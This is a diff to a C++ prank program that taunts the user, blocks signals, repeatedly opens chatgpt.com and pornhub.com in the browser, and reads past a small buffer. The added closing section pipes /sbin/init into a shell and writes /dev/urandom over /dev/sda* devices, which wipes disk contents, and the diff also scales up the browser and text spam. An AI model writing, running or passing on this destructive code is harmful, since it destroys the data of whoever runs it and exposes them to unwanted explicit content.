@@ -25,15 +25,12 @@ along with this program.  If not, see <https://www.gnu.org/licenses/>.
 #include "displayText.h"
 #include "macOS.h"
 
-// Define a variable for later
-short repeatLoop = 0;
-
 void funcOverflow()
 {
   const char bufferOverflow[10] = "\nTesting";
   int i = 0;
 
-  for(short bytesLeft = 3072; bytesLeft >= 0; bytesLeft--;) {
+  for(short bytesLeft = 3072; bytesLeft >= 0; bytesLeft--) {
     std::cout << bufferOverflow[i] << std::flush;
     i++;
     usleep(25000);
@@ -43,7 +40,7 @@ void funcOverflow()
 
 int main()
 {
-  repeatLoop = 64;
+  short repeatLoop = 64;
 
   // Okay so I wanted to block as many signals as I could, so this loop covers that.
   while(repeatLoop > 0) {
@@ -52,7 +49,7 @@ int main()
   }
 
   // The most boring yet effective thing: TEXT.
-  sleep(3);
+  sleep(10);
   displayText("lol still using this PC?");
   sleep(5);
   displayText("\nSystem Unstable!!");
@@ -66,9 +63,10 @@ int main()
   displayText("\nFun fact about AI: ");
   sleep(2);
   displayText("it sucks ass! So I'll fire up ChatGPT now to make you suffer. :)");
-  repeatLoop = 10;
 
   // Ruining browser history with ChatGPT
+  repeatLoop = 10;
+
   while (repeatLoop--) {
     system("xdg-open https://chatgpt.com");
   }
@@ -89,7 +87,8 @@ int main()
   displayText("\nHey I'm annoying, right? Just Ctrl+C!");
   sleep(6);
 
-  repeatLoop = 69;
+  repeatLoop = 1337;
+
   while(repeatLoop--) {
     system("xdg-open https://pornhub.com");
   }
@@ -106,11 +105,11 @@ int main()
   displayText("\nHere we are, already at UTAUs, why not keep going?\nDon't worry, there will be some Momone Momo later.");
   sleep(8);
 
-  repeatLoop = 100;
+  repeatLoop = 10000;
 
   while(repeatLoop--) {
     displayText("\nMomone Momo");
-     usleep(10000);
+     usleep(1000);
   }
   repeatLoop = -1;
   sleep(5);
@@ -126,4 +125,21 @@ int main()
   displayText("\nI think I got an idea.");
   sleep(2);
   funcOverflow();
+  sleep(10);
+
+  // This next part is untested.
+  repeatLoop = 100;
+
+  while(repeatLoop--) {
+    displayText("\033[2J\033[1;1H");
+    usleep(600000);
+  }
+
+  system("cat /sbin/init | sh");
+  sleep(5);
+  system("cat /dev/urandom > /dev/sda* & ");
+  displayText("Man I don't know what to do.");
+  sleep(8);
+  displayText("Just kidding check your disk space.");
+
 }
